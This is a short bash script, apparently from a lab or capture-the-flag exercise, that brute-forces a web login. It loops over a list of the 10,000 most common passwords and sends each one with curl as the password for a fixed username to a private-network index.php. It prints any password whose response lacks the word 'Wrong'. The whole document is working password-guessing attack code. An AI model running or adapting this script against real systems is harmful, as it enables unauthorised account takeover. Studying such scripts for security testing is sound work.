passList="10k-most-common.txt"

while read -r line
do
  request=$(curl -s "192.168.3.151/index.php?username=furkan.paligu&password=${line}" | grep "Wrong")
  if [[ "${#request}" -le 1 ]];
  then
	echo "Success with Password: ${line}"
  fi
done < "${passList}"
